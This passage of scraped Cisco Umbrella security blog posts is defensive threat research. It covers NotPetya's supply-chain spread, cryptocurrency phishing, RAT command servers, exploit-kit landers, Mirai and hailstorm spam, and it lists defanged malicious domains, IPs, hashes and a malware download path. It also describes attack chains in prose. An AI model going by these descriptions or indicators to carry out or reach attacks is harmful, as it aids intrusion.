was behind a worldwide cyber attack that took place in June of last year. It said the attack, quote “Will be met with international consequences” The White House called the NotPetya attack the most destructive and costly cyber attack in history. The attack caused billions of dollars in damage in North and South America, Europe and Asia. It was part of Russian efforts to destabilize Ukraine which suffered major blows to it’s government, financial and energy institutions. The US now joins the British government in condemning the attack. The White House said it’s reviewing a range of options on how to proceed. Mike Storm: One of those efforts was to slap sanctions on Russia, which the Treasury Department finally got around to on March 14th of this year. Last year, shortly after we had all recovered from the WannaCry event, another event in June started to spread, and the way it was constructed was so genius, it’s scary. Craig Williams: Yeah, I think Nyetya was probably the most advanced piece of malware for 2017. One of the ways I try to explain it to people is, you can think of WannaCry like that ’87 Honda Civic you had in high school. It technically ran, but not well, you have to start it just the right way and be careful how you drove it because the wheels might fall off. Compare that to Nyetya which would be like a BMW m5 Competition Edition. It’s the same ballpark technically, but not performance wise. Nyetya had the fastest scanning algorithm we’ve ever seen, it was multi-threaded and capable of communicating in between the threads so that it could scan an entire IP space in a very, very minimal amount of time. We’re talking tens of thousands of victims a second. Mike Storm: Nyetya gets it’s name for its similarities to Petya, another form of ransomware. You heard the newscaster say the White House described it as one of the most damaging and costly attacks in history. You might have to check the totals, but it was global and definitely very costly. In fact, FedEx was hit by WannaCry, and they reported their European Express shipping company TNT had to process packages by hand after being hit by Nyetya. Between WannaCry and Nyetya, FedEx reported it would cost a shipping company somewhere around 300 million. Maersk, one of the largest shipping companies in the world, also said the company would see losses in the 300 million range. Merck, the pharmaceuticals company, likewise reported losses of up to 310 million. So, if attackers are looking to do major damage, it appears that they found a pretty effective method. Here’s Craig again on how this attack works. Craig Williams: To top it off too, Nyetya was very, very cleverly deployed via what we call a supply chain attack. If you’re not familiar with the term, a supply chain attack is basically where you take advantage of a trusted supply chain, like maybe an applications update system, to actually deploy the malware. That’s the complete opposite of the technique WannaCry used, which is just spread loud and fast. Supply chain attacks are gonna spread and no one’s even gonna know what happened. Mike Storm: Supply chain attacks are very insidious, they can spread and operate while appearing like normal network traffic, and according to Craig, they can even deploy but lie in wait for just the right moment. Craig Williams: Nyetya was very interesting, because it used that supply chain vector, no one knew it was there. It was also super creepy because it was detonated shortly after the assassination of a Ukraine military Intel official. So, from our perspective, effectively what happened was these people implanted this bug through this software called M.E.Doc. M.E.Doc was a piece of tax software used in Ukraine, was only one of two approved tax software packages. I think Reuters published a number that 80% of all systems had it installed. I don’t know how accurate that is, but let’s just say it’s a lot. So, what happened was the attacker basically fished credentials or somehow got his hands on credentials, logged into M.E.Doc’s server, modified the engine X config, and pointed it at their server over at OVH, and then effectively at that point, the M.E.Doc’s update server was just a man-in-the-middle. Unintentionally, the victims are all going through M.E.Doc, straight to OVH and downloading a backdoor binary. Mike Storm: The assassination that Craig mentioned was a car bombing in Kiev on June 27th of 2017. Maksym Shapoval, a Colonel of Ukraine’s Military Intelligence, was killed in the attack. Craig Williams: I think it was staged too. From Tallis’ perspective, it was retaliation. Now, what was really interesting about Nyetya was the fact that it had been spreading inside of these networks completely undetectably for three months. You remember how quickly I said Nyetya spread, what also is the second, quote, “ransomware worm ever”, but unlike most worms, it actually used four different vectors. It was even smart enough to apply the vectors in order of least likely to be noticed. It actually very rarely used EternalBlue or EternalRomance, which were the two code execution vectors. More often than not, it would simply pull the credentials out of memory using a modified version of Mimikatz and then just spread over the windows servers, the domain servers. So, super clever, super, super interesting. They even went and modified the DoublePulsar backdoor that was part of the EternalBlue exploit. So, at this point, EternalBlue had been out for months. I think Microsoft patched it at the beginning of the year. So, everybody was scanning their systems for the DoublePulsar backdoor, which was stage two of EternalBlue. Well, these guys were smart enough to actually go in and modify the response codes, so that even if you scan the systems, it would still come back as not compromised. We’re talking layers upon layers of evasiveness and cleverness. The people who wrote this, not only knew what they were doing from a development standpoint, but they knew what they were doing from a security standpoint and how people would look to detect this. So, incredibly evasive, incredibly fast. I guess the icing on the cake was the fact that it was actually basically a cyber weapon masquerading as crimeware. The reason people called it NotPetya was because it had a ransomware screen similar to Petya, but there were still several gotchas even on that, like using an email address as the primary point of contact. Ransomware has been out since 1986, people know how to get paid. You set up a site on tor, you have them get a key, you verify that and then give them back the key once they put the Bitcoins in the wallet. So, the very fact that they had an email as a primary point of contact, was a real interesting perspective. And then, as our team reverse engineered the binaries, we found out that they literally never saved off a key. So yeah, there is literally no way to recover any of the files, short of finding a problem with the encryption algorithm. So, that’s how we knew it was actually just Wiper malware masquerading as crimeware. One of the more interesting things about it is, think about how it worked, so I mentioned it followed an assassination attempt, so three hours after the assassination attempt, this malware was detonated, and keep in mind it had been spreading for months. So, it’s in, according to Reuters, 80% of all systems associated with Ukraine, and even if it was a US company, if they had a system in Ukraine where they had to pay taxes, they’re gonna have one of those machines in their network. So, for three months that machine has been silently spreading in their network hitting every box it could, getting into everything, and then three hours after that car bombing, they pushed the button, the malware detonates, and all of the systems suddenly completely are wiped. The even creepier part of this is think about the access that they were giving up, this wasn’t just a piece of Wiper malware, this was a full-featured backdoor. This thing allowed them to upload and download files, modify files, turn on key loggers, do anything they wanted, literally anything, and they chose to throw that away to send a political message, presumably. Mike Storm: So, was the purpose of Nyetya to shift focus off of the car bombing? Or are the two related? The timing is definitely hard to deny, especially considering the bombing happened just before Ukraine’s Constitution Day, which is a celebration of the country’s independence from the Soviet Union. The CIA, though it declined to comment publicly, was quoted as having high confidence that the car bombing and the ransomware attack were both perpetrated by the Russian military. This isn’t the end, as I mentioned, events that have happened since WannaCry and Nyetya, show that hackers are keen to modify these attacks and use them for their own purposes. Just four months after the Nyetya event, a new ransomware variant called Bad Rabbit hit Ukraine, Russia and Eastern Europe, infected thousands of networks and caused hundreds of thousands of dollars in damages. Bad Rabbit wasn’t a worm, but it shared a large portion of code and even the same ransomware lock screen from Nyetya or NotPetya. In October last year, a new variant of WannaCry hit a North Carolina healthcare provider’s network. First Health, the provider, said in a statement that the ransomware hit four thousand endpoints in about a hundred locations in it’s network. Just a few weeks ago, Cisco released it’s 2018 annual Cyber Security Report, and it cites a recent supply chain attack, which is what made Nyetya so sophisticated and successful as we heard Craig describe. In this attack, hackers compromised download servers for the popular Windows maintenance software called Ccleaner. Users looking to download the software, unknowingly also downloaded and installed a trojan backdoor, but the software had a legitimate certificate through a legitimate software provider, which gave the user confidence. According to the report, these type of supply chain attacks are going to increase both in velocity and complexity and they have the potential to hit on a massive scale, but it doesn’t take a huge cybersecurity budget or advanced red team abilities to mitigate some of these attacks. Most of the time IT teams just need to keep up with the fundamentals. Patching, segmenting their networks, keeping policies in check, having a strict incident response policy in place and of course backups. Just weeks ago at RSA, the largest security conference in the world, Microsoft vice-president Brad Smith specifically citing the WannaCry event, announced a cybersecurity tech accord. Thirty two other companies, Cisco included, signed a pact of sorts that commits to sharing threat intelligence and to oppose state-sponsored cyber attacks against civilians. Information sharing is a powerful tool, whether you’re a journalist or a Sysadmin or a security researcher, sharing helps expose the magnitude of the problem. Craig Williams: By getting that word out and helping people realize that security cannot be an afterthought, they help people carry that message into the boardroom. So, it’s no longer just an IT guy conversation, it’s an executive conversation that security must be taken seriously, that data must be kept secret, and you have to have the proper defenses in place or you could be the next victim. Mike Storm: Many thanks to Craig for sharing his insight info on this episode. Root Access is produced by Mike Storm, Owen Lystrup and Lynn Cox. Thanks also to our sound engineer Bill Birch and Mix Master, Composer extraordinaire, Joel Davis. Make sure to subscribe to this podcast on iTunes, Stitcher and Google Play. We’ll be back for season three soon, until then, stay paranoid friends. Root Access is sponsored by Cisco Umbrella. For more information, visit Cisco Security .", "date": "2018-04-30"},
{"website": "Cisco-Umbrella", "title": "Protecting ICOs and cryptocurrency users", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/protecting-icos-cryptocurrency-users", "abstract": "A whole new world of ICO Bitcoin and cryptocurrencies are disrupting not just the currencies market. A newly observed trend of Internet Coin Offerings (ICOs) is changing the way VCs work with startups.  A recent Coindesk report states that the Bancor ICO set a record by raising $153 million in Ether from approximately 10,885 buyers. According to Coinschedule, 140 of the currently active ICOs have raised over two billion dollars while Reuters estimates the overall value of the coin market is over $90 billion. ICO is not yet the most popular choice among startups or investors, but interest is increasing despite the many challenges it faces. While the largest challenges for ICO might be regulatory or legal, the focus here will be on security issues. Some of these issues include bugs in smart contracts , attacks on the websites of companies offering an ICO , errors in the implementation of multi-sig wallets , and DDOS attacks on currency networks. These contribute to about 50% of all cybercrime revenue, with the remainder being phishing schemes. Chainalysis , a blockchain analysis company, estimates the value of stolen cryptocurrencies from phishing attacks to be at 115 million dollars from over 16,900 victims. Tracking phishing campaigns While the main protection mechanism we rely on in identifying phishing domains is our machine learning-based model, NLPRank, which is actively enhanced to detect different crypto currency wallet phishing attempts, we continue to apply other hunting approaches that leverage additional visibility into DNS data. Pivoting around IPs, registrants, and name servers allow us to expose bullet-proof hosting infrastructures and to block emerging attacks as soon as they go live or before they are launched. Automated phishing pivoting flow Part of a phishing attack infrastructure exposed via this process: Exposed Phishing infrastructure Blockchain[.]info, MyEtherWallet[.]com, Bittrex[.]com and several ICOs are some of the targets in recent campaigns. Their infrastructures are tied to Russian, Ukraine, and Hong Kong IP address space. Most phishing attempts still come in form of mass sent spam emails with generic messages which example we can see in the picture below: Typical message in the BTC phishing email While majority of the phishing domains has low amount of hits, with average count between 15 and 100 Query volume to the phishing domains Query volume to the phishing domains Other delivery methods, such as search result poisoning, have proven to be an effective means of phishing users. This can be seen below, with a link to a phishing site listed during a google search for ‘myetherwallet’: Poisoned Adwords example Phishing domain served via Google Ads Such domains are able to drive big amounts of traffic in short period of time and have better conversion rate: Amount of traffic to phishing domain via poisoned ad Another important aspect of the recent campaigns is the fact that malicious actors utilizing all of the newly emerged phishing methods such as homograph attacks and abuse of SSL as we can see in following picture: Homograph attack on MyEtherWallet IOCs New threats are emerging It’s not just cybercriminals who have historically been involved in phishing which are turning towards cryptocurrencies. Recently, we discovered a strain of a credential stealer which targets digital wallets stored on computers as well as online services.  This threat is delivered via malspam messages with an attached doc file that contains a Powershell script which downloads malware. Then it finds stored wallets and credentials and uploads them to the C2: What to expect We first observed phishing campaigns targeting cryptocurrency users in June 2016 when nobody knew what ICO was and when Bitcoin’s price was about $700. Now with Bitcoin’s price skyrocketing to nearly $4,000 and over 140 ICOs coming, we are sure that phishing attempts will continue to haunt cryptocurrency ICOs and their users. Anyone who is already a cryptocurrency user or is thinking about becoming one should be very careful. Some tips to avoid becoming a victim: Don’t follow any links in messages from services, try to remember or bookmark the services that you regularly using and avoid advertised google results Be suspicious of messages in social media and Slack forums, especially if they contain any URLs Treat messages from bots very carefully, as they can be easily crafted by malicious actors Use your common sense and check anything suspicious in the open source projects", "date": "2017-09-27"},
{"website": "Cisco-Umbrella", "title": "Rise in Bitcoin leads to more Phishing attacks", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/bitcoin-phishing-attacks-gain-traction", "abstract": "Newly Discovered Bitcoin Phishing Campaigns Analyzing the results of the OpenDNS Natural Language Processing(NLP) rank classifier , we have recently discovered new Bitcoin wallet companies that have made their way on to the list of phishing targets. We were able to identify phishing campaigns aimed at Kraken and Paxful users. Phishing domain imitating paxful.com login page Phishing domain imitating kraken.com login page It was nice to see fraudulent domains taken down in a timely manner and additional security mechanisms being put into play. One such mechanism used on Paxful is a fidelity warning at the login screen: Ongoing campaigns Old campaigns against blockchain.info and localbitcoins.com are experimenting with different registrars, but aren’t going anywhere: Suspended domains: https–blockchain[.]lol, blockchain–login[.]org blockchain-wallet1[.]info: This domain is still up and running but looks broken Active phishing domain Active phishing domain The three most recently detected domains are still alive and look to be part of an active, currently ongoing campaign. We can also see that the amount of phishing attacks against bitcoin users keeps increasing. Leveraging the power of Investigate by pivoting around detected infrastructure, we found that it is not only used to host fraudulent Bitcoin domains, but a whole range of other nefarious ones as well. However, the most successful domains in this new campaign are block-clain[.]info and blockchalna[.]info. Both domains were registered on February 21, 2017, and went live on February 24th, getting over 200k DNS queries in a couple of hours. This is an interesting fact, since it correlates with Bitcoin reaching another maximum and the disclosure of CloudBleed . Traffic delivery scheme hasn’t changed: we’re continue to see compromised Adword Google accounts used to host ads, which redirect users to phishing domains. Malicious Ads Visualizing actor relations In the visualization of the domains and associated email addresses from the campaign (image below), we outline shared hosting infrastructure by multiple actors. Red colored domains are spoofed bitcoin wallets, while the rest is a mix of banking, adwords and tax fraud websites. Visualization of the phishing campaign We also see an increasing amount of phishing and other credentials harvesting attacks(RATs, InfoStealers), which result in an increase of account-checking activity. Since cyber crime services like Sentry MBA are widely available to criminals, their ease of use paired with wide variety of available config files makes us confident that the number of actors engaging in such attacks will keep growing, particularly among lower level actors. This blog is a result of collaboration between Artsiom Holub of Cisco Umbrella research team and Jeremiah O’Connor of Cisco country digitization team. Related Indicators A list of BTC_phishing_IOCs [PDF] applicable to this blog post can be found here: https://s3-us-west-1.amazonaws.com/umbrella-blog-uploads/wp-content/uploads/2017/02/26230545/BTC_IOCs.pdf", "date": "2017-02-28"},
{"website": "Cisco-Umbrella", "title": "Finding the RAT's Nest", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/finding-the-rats-nest", "abstract": "We’ve spotted a Remote Access Trojan(RAT) and are headed down into the unknown. In this blog post we’re going to examine some malicious infrastructure that we’ve found by pivoting through domains delivering and communicating with RATs. A RAT is malware that creates a back door to gain access to the target and its connected resources in order to spy/steal information, drop additional malware such as ransomware, or to enlist the target into a botnet for DDoS purposes. A RAT can basically give all of the same access to a system that the attacker would have if they were physically accessing the target. A RAT has many functionalities: remote desktop control, webcam and microphone control, keylogger, remote shell, crypto miner, download and execute functionalities, screen capturing. Purchase and Preparation When deciding on which RAT to setup and spread, there is a choice between free or paid varieties. There are RATs that are free to use and RATs that require one to pay for a license. They vary in their ease of setup and stability. Since these RATs have been available for years and are detectable through signatures, a “crypter” is used on the malware before deployment. Crypters are tools that can use encryption and obfuscation on the malware in an effort to make them FUD (Fully UnDetectable) against known pattern based or behavior based signatures used in Anti-Virus or IDS/IPS systems. When a low detection rate is reached they have a better chance of infecting targets. The goal is to appear to be a harmless program. Once crypted, criminals run the file through underground scan services that will tell them their file’s achieved detection rate. The ease of setup and availability of these RATs have helped them remain a threat. There are also rental services, offering to do all of the setup needed to build the infrastructure for RATs and bots, and then rent the use of them for a price. Advertisement for RAT and Botnet Setup Services LuminosityLink is widely considered by some cyber criminals to be one of the best RATs. When searching for only one AV signature from Malwarebytes , Backdoor.LuminosityLink, in Virustotal with a First Submission date of the last 30 days; there were 147 new submissions. On our resolvers, we see active traffic to the Command and Control (C2) panels and infrastructure behind these RATs. LuminosityLink Let’s investigate some infrastructure around this paid RAT, LuminosityLink. In The Wild LuminosityLink is seen here dropped from this site, http://onsitepowersystems[.]com/invoice86291320[.]zip , which appears to be exploited with the C99 Shell. The delivery method is a bit.ly link leading to the zip file at onsitepowersystems[.]com . The C2 communications are at 191.101.22[.]47 . LuminosityLink ZIP on compromised website The bit.ly link as well as the onsitepowersystems[.]com zip file are still active at the time of this analysis. As a side note, OpenDNS offers the optional filtering of the URL Shortener category on your network. While URL shorteners are not malicious by design, removing access to them can help protect your users from clicking on links that will redirect them to unexpected places. Bit.ly redirect to LuminosityLink download LuminosityLink Executable Above sample 083bb90a33710585883ae6bbb7f36437c083a5d889a3e4e3994955a53bfa1be0 On and On… Here are a few more C2 panels and associated traffic we’ve recently seen coming through our resolvers. thevm2[.]biz and blackhills[.]ddns[.]net thevm2[.]biz – C2 panel for VM-ZeuS aka KINS (malware that was part of Avalanche ) seen with traffic from a LuminosityLink sample and domains associated with Ramnit (a banking trojan). This RAT is dropping additional malware; utilizing it’s download and execute functionality. 0247b0ecbf6069e38e772ef546e63c46262cc77efe5d004a3ec516baf0e74d87 1ae134e146c43891a6e28d917d9cfcf32bb0ff435051261462b57181320b992a ac3ade715adafa5784c43f407843bf8889e7c97c4e62239c1b22f07aab2920c9 thevm2[.]biz VM-ZeuS Traffic seen on OpenDNS resolvers The email address nie0461@gmail[.]com is the registrant for thevm2[.]biz and the following domains. marciaguthke[.]com email-hosting[.]us emailhostings[.]in myvm2[.]biz thevm2[.]biz vm2online[.]biz We’re blocking hackcom[.]org which has the nameservers that are hosting these panels currently, and hosted some in the past. Pivoting through these registrant’s domains, we find more malicious infrastructure. vm2online[.]biz – more panel configs vm2online[.]biz marciaguthke[.]com – redirected to a fake Microsoft support page Fake Support This domain virus-os-77h7ft[.]pw is hosted on 192.111.155[.]6 , which hosts tons of fake AV support domains. By blocking this IP address, we prevent access to all of these domains. Known domains from 192.111.155[.]6 as seen on our resolvers From RATs, to banking trojans, to fake support domains. Due to a RATs ability to drop additional malware and the criminals utilizing different delivery methods, we’ve found a wide range of infrastructure and traffic comingling. By fully understanding the traits of the attack, we can make the most effective counter to protect our customers.", "date": "2017-01-18"},
{"website": "Cisco-Umbrella", "title": "Announcing two new security categories for Cisco Umbrella", "author": ["Kevin Rollinson"], "link": "https://umbrella.cisco.com/blog/announcing-two-new-security-categories-cisco-umbrella", "abstract": "Today, we’re excited to announce the availability of two new security categories for Umbrella: DNS tunneling VPN and Potentially harmful. DNS tunneling VPN DNS tunneling is the ability to encode the data of other programs or protocols in DNS queries and responses. 1 Anti-virus programs and security services use DNS tunneling to fetch signatures. But, not everyone uses DNS tunneling for legitimate reasons. It can be used to hide outbound traffic, concealing data that is typically shared through an internet connection. For example, a DNS tunneling VPN service could be used to exfiltrate data — and since the traffic isn’t normally monitored, such an attack would be difficult to catch. To help with this, we are announcing DNS tunneling VPN as a new security category within Cisco Umbrella. This category classifies servers associated with commercial DNS tunneling VPN services. These services allow users to disguise outgoing traffic as DNS queries, potentially violating acceptable use, data loss prevention, or security policies. These services present a potential security threat and reduce overall visibility. By enabling this new security category, Umbrella customers will be able to reduce the risk of DNS tunneling and potential data loss. Potentially harmful Beyond DNS tunneling VPNs, other types of DNS tunneling have use cases that can be uncertain and risky. It can be beneficial to monitor and possibly block these uses and other suspicious domains. Our researchers have developed the Potentially harmful category to give customers insight and visibility into these domains. You can think of it as the “I have a bad feeling about this” category. It contains domains that are likely to be malicious, but with a lower level of confidence than those that are classified in our normal block lists. For example, DNS tunneling services that cannot be tied to a specific type of service will fall into this security category. Another example comes from our Spike rank model . The traffic that hits high on the Spike rank domain will automatically be classified as malicious, and traffic that is lower on the threshold will fall into the potentially harmful category. Availability For both categories, customers can block or monitor the results in reports, providing flexibility to determine what is right given their specific risk tolerance. These categories will be available to customers of all Umbrella packages and Umbrella for MSPs starting January 18th. 1 http://www.circleid.com/posts/20131030_dns_tunneling_is_it_a_security_threat/", "date": "2017-01-17"},
{"website": "Cisco-Umbrella", "title": "Catching Exploit Kit Landers", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/catching-exploit-kit-landers", "abstract": "Exploit Kits play an integral role in many of the attacks we see on a daily basis. In this blog post we show how we use our data in a novel way to uncover new components of the attack infrastructure and protect our customers earlier. Background A race unfolds each time a new WordPress, Joomla, or similar web application vulnerability is disclosed. Actors are looking to quickly craft an exploit and search the internet for vulnerable instances. Once compromised, these personal and business websites are turned against their users to become Exploit Kit Landers. Each visitor is selectively evaluated by the time of day they’re visiting the site, their source IP address, along with the versions of their browser  and various plugins. If they match a specific profile, the Lander injects a single line of HTML or JavaScript code into the page. This line of code makes a call to the Exploit Kit Gate, which serves up a worthy exploit to take advantage of a vulnerability in an often outdated browser or plugin used by the visitor. We use the term ‘Gate’ to describe the attacker-controlled system which may serve the exploit itself or may be an intermediary step where the client is profiled a second time then sent to the exploit. With arbitrary execution achieved on the visitor’s system, the exploit kit has done its job. The shellcode of the exploit downloads a binary and executes the payload of the attacker’s choice which, in many cases, is ransomware. So Many Callbacks The infection chain is littered with internet callbacks between the attacker and the victim. The victim first goes to the infected Lander, then is redirected to the Gate, then downloads the payload, and then calls back to ransomware command and control (C2) to negotiate keys. We can detect this communication at the network layer and ultimately prevent an infection from succeeding by blocking communication to the hosts involved in any of these callbacks. While we have developed systems to uncover each of these callbacks, one group which is particularly interesting to us are the Landers. Avoiding Detection Actors take special care to protect their landers from discovery. These websites can be popular blogs or businesses that may have sizable followings and rank high in search results. If a high traffic lander is uncovered, it could mean a sizable opportunity loss. To avoid detection, actors will only expose functionality for specific hours of the day, exclude certain IP addresses, and refuse to infect a visitor more than a set number of times. Block Page Referrers Every time one of our users attempts to visit a malicious website, we notify them by redirecting their browser to our block page. This is helpful to our users, but is also valuable to our researchers as another data source to perform analytics on. We store the full HTTP request every time a user ends up at one of these pages so good news for us: we can also see how they got there. Hackathon Project: Find New EKs! As a project during our annual hackathon at the beginning of last month, we decided to use our block page logs to identify new landers. Our end result was a module for our Avalanche System which allows us to stream in new data at near real time and protect our customers right away. Block Page Logs The logs from our block pages are just raw HTTP logs. By looking at the Referer HTTP Header data, we can identify how users end up at a Gate. We first parse them into a dictionary that looks like this: We have a couple things working for us: We already know that this user is doing something risky since they’ve arrived at our blocked page and are in our logs. We’re also streaming in exploit kit gates, so we already know that headers.host is a gate that we’ve uncovered with our other classifiers. The thing we might not have prior knowledge about is the referrer, geiserpharma[.]com. New Landers Attackers may set up their imposter websites or they may compromise legitimate websites, so it can be tricky to determine if a referring site is actually malicious. One way to root out false positives is to ensure the referrer is not an extremely popular site. We can use the top 5000 domains in the Cisco Umbrella 1m as a filter and check the popularity within Investigate. Our suspected lander geiserpharma[.]com has very low popularity. On a scale on 0-100, where 100 is very popular, geiserpharma[.]com is a zero. Line of Fire Let’s visit geiserpharma[.]com just to test. The other nice thing we get from the block page logs is the User-Agent . This is useful since many Exploit Kits will profile the user and only launch an exploit if it appears to be vulnerable. By using the User-Agent in the logs, we’re one step closer to having the exploit kit show itself. Surprise, surprise: Internet Explorer Crashes and we get a very concerning Windows Script Host error! All-in-all there were four major steps to this infection, here they are as Fiddler sessions: If we dig into the HTML source of the page, we see a suspicious iFrame buried in the middle of it: Now, these landers will very often cycle through a few different gates as you render the page. So if we wait a little time, then request the page again, we get: These iFrames include additional JavaScript to profile the user and ensure they are vulnerable: With a confirmed wounded duck, the JavaScript posts back to the gate which returns a big nasty page with tons of obfuscated JavaScript. Parts of the JavaScript are encoded just right to make Fiddler hiccup when processing. By saving the raw bytes using HexView we can see the resulting JavaScript. A few breakpoints later, we reveal three levels of JavaScript obfuscation that result in the inclusion of a Flash object into the original landing page (geiserpharma[.]com). This Flash object contains exploits a vulnerability which achieves code execution in the context of the browser. The SWF is passed a few hex-encoded items via the FlashVars variable. This supports the modular nature of the exploit kit. Any exploit kit customer can provide a download URL which is passed from JavaScript, through Flash, arriving as an argument to payload which is eventually executed. We can see this by inspecting the ROP Chain that the exploit uses once it achieves control over the instruction pointer. The payload itself is simply a one liner to create a Windows Script Host temporary file that downloads, deobfuscates, and executes Cerber Ransomware via a DLL using  regsvr32.exe. But wheres the Arduino? It can’t be a hackathon project without having something controlled by a small microprocessor, so we bolted on an API to our feed of fresh new landers and set up a Raspberry Pi to query it. Every time a new lander was identified, the Raspberry Pi triggered a PowerSwitch Tail which flipped on the electricity to my Christmas Tree and sent the train below racing around its track.", "date": "2017-01-11"},
{"website": "Cisco-Umbrella", "title": "The Future is Here – Assaulting the Internet with Mirai", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/future-assaulting-internet-mirai", "abstract": "As we begin our journey into 2017, many of us will take the opportunity to look back on how 2016 went. This time of year is conducive to self-reflection and introspection, learning from the past to prepare for the future. Though there were many incidents over the course of the past twelve months, none captured my attention as much as the Mirai botnet. Adaptable, difficult to detect, and enormously disruptive, I believe Mirai to be the first in a series of new threats which will impact the world on a scale that was previously unimaginable. Cried Out In Unison – Biggest DDoS of 2016 Mirai first came into the media’s attention around September when researcher Brian Krebs was targeted by a historically large DDoS attack. In his debrief with Akamai, it was noted that rather than relying on DNS amplification to achieve such traffic, it seemed to have come from many different sources. This suggested that a enormous number of devices were compromised, and soon enough the world started to hear and read the word “Mirai”. This enterprising botnet took advantage of the insecurity of internet-connected smart devices like cameras, printers, DVRs. By using a brute force attack and trying commonly used administrative passwords, Mirai took over millions of devices all around the world. This translated into more available bandwidth for attackers to use and overwhelm servers. Analyzing data coming from a honeypot built similarly to those designed by arm5077 and robertdavidgraham , we were able to gather 111,783 connections in a period of just 30 days. After removing the duplicates, we were left with 8,578 unique IPs to work with. Mirai geolocated IP addresses Based on served HTTP banners and Shodan data we identified: 2,861 surveillance cameras 759 DVR players 1,088 routers 76 firewall devices The results help to clarify Mirai’s significant difference from classic botnets — its choice of targets. We can see that rather than attacking home computers, its victims were internet connected devices which have long been under the scrutiny of security researchers, and that choice made it incredibly successful. By striking at things that were both insecure and extremely popular, the botnet was able to gain ground quickly. With unprecedented DDoS power, attackers were able to go after huge targets: after Krebs, French host OVH was attacked , then Dyn, then the country of Liberia , and most recently Deutsche Telekom . In the span of just a few months, vital pieces of the internet’s infrastructure have been assaulted by Mirai, and there’s no reason to believe this will subside in the coming years as more IoT devices make their way into homes everywhere. Vulnerable devices can be found almost anywhere. Geolocation of captured IP addresses indicates that majority of the infected devices are based in Taiwan (1,152), Vietnam (1,136), China (789), Brazil (650), Turkey (483), Russia (426) and India (408). Visualization of IP addresses used by Mirai Mirai’s Future – Predicted Paths Based on observed combinations of default credentials used by bots, we predict that the next devices which will be targeted by Mirai include: ACTi IP Cameras ANKO Products DVRs Axis IP Cameras Dahua Cameras and DVRs Dreambox TVs HiSilicon Cameras Mobotix Network Cameras Realtek Routers SMC Routers Ubiquiti AirOS Routers VideoIq Systems When the source code of Mirai was released to hackers, this made it only more attractive for ambitious malicious actors looking to adapt it to their needs. Recently, it has been modified to create domains through a DGA to better avoid detection and keep a constant contact with C&C servers, and it seems likely that changes will be made to start implementing Tor and other traffic obfuscation methods. David Rodriguez recently profiled this new DGA enabled variant in a blog post , and the data he gathered combined with the analysis done by other researchers has revealed Mirai to be a thoroughly interconnected piece of malware, sharing space with ransomware distributors and other assorted awful things on the internet. Visualization of domains generated by Mirai and cooccurences. Into the Breach – Next Steps So where do we go from here? What can be done about Mirai and other IoT botnets that are sure to follow? The largest share of the burden lies with manufacturers who continue to fail to address the issue of using weak security practices with their products. Devices should be sent from the factory with unique credentials instead of collectively sharing an easily guessed login and password combination such as “admin/admin” or “admin/password”. It would also be very helpful to limit access through commonly used ports and protocols like Telnet. IoT devices need to be designed with built-in protections against intrusion and compromise by using unique device passwords and preventing insecure remote logins. Individual users and administrators can help themselves by logging into the devices in their possession and changing weak passwords, as well as implementing port defenses to keep remote communications at bay. Though this might make a dent in reducing the amount of devices that are vulnerable, the most effective place to make this change is at the manufacturer’s level. Further, ISPs and DNS providers need to be aware of the problem and work closely together. The possibility of attacks at this scale must spur changes, both to the underlying architecture of the internet and the companies that deliver it as well as to the methods of response to massive DDoS attacks from the entire internet community. Given that IoT botnets will grow larger as more devices connect to the web, we must change the internet’s ability to handle it and our responses to it. 2017 will prove to be a very interesting year, and rather than simply watching it as it unfold, we must be willing to meet its challenges head on. The future is here, and we must prepare ourselves now. Thanks to Austin McBride for contributing visualizations.", "date": "2017-01-05"},
{"website": "Cisco-Umbrella", "title": "In the Eye of Hailstorm", "author": ["David Rodriguez"], "link": "https://umbrella.cisco.com/blog/in-the-eye-of-hailstorm", "abstract": "This blog post was authored by Jakob Dohrmann , David Rodriguez , and Jaeson Schultz . Intro The Cisco Talos and Umbrella research teams are deploying a distributed hailstorm detection system which brings together machine learning, stream processing of DNS requests and the curated Talos email corpus. Talos has discussed snowshoe spam before. Traditional snowshoe spam campaigns are sent from a large number of IP addresses, and a low volume of spam email per IP address. Using such techniques, snowshoe spammers intend to fly under the radar with respect to any reputation or volume-based metrics that could be applied by anti-spam systems. This post concerns “hailstorm” spam. Hailstorm spam is an evolution of snowshoe spam. Both snowshoe and hailstorm spam are sent using a large number of sender IP addresses, but unlike snowshoe spam, hailstorm campaigns are sent out in very high volume over a short timespan. In fact, some hailstorm spam attacks end just around the time the fastest traditional anti-spam defenses can update in response. The images below, taken from Umbrella Investigate, nicely illustrate the difference between a typical snowshoe spam campaign versus a typical hailstorm spam campaign. The top image below illustrates what the DNS query volume looks like for a domain involved in a typical snowshoe attack. Note the maximum query rate is only 35 queries per hour for the snowshoe domain example. The bottom graph, in contrast, shows the DNS query volume for a domain involved in a typical hailstorm attack. In this graph, there is practically no query volume until suddenly when the DNS query volume spikes to over 75K queries per hour, then drops back down to nothing. Typical DNS query volume patterns for traditional snowshoe spam (top) vs. hailstorm spam (bottom). Hailstorm spam is being sent from IP addresses located all around the globe. Looking at the geo-ip distribution from recent hailstorm spam campaigns, the US, Germany, Netherlands, Great Britain and Russia lead the pack in terms of volume of hailstorm spam sent by country. Hailstorm spam also involves domains registered at a wide array of Top Level Domains (TLDs). In a recent sample of ~500 hailstorm-related domains, the most common TLDs were .top, .bid, .us, .win and .stream. Affiliate Programs and Sponsored Links Most of the campaigns we initially detected advertise products comprising home-surveillance systems, flashlights, dietary supplements and all sorts of items “as seen on TV”. Services as diverse as bathroom remodeling, online degrees and psychic readings are common as well. Below is an example of a typical affiliate offer, sent using hailstorm techniques. This particular hailstorm campaign was advertising dietary supplements. Links in the original email are redirected several times before reaching the landing page, which in turn links to an order form on an affiliate page. URL parameters containing recipient IDs, or any other Personally Identifiable Information (PII) have been redacted to protect the innocent. Email From: ultratrim350@secretaryship.coisow.us Contained links are of the form: http://<subdomain>.coisow.us/about/us/<redacted> These links are redirected several times, hitting domains such as lbmcgroup.com, trackwebly.com, trackwb.com, atomtrk.com, ecptrx.com, ih-trk.com. Landing page: http://fitnessandenergytips.com/diet/weightlosssecret/index.php?<redacted> This page contains multiple links to an external order form (see below). Order form: https://getultratrim350.com/lp/bellymelt-p/index.php?<redacted> In addition to the order form, this page contains a link to an affiliate sign-up page (see below). Sign-up page: 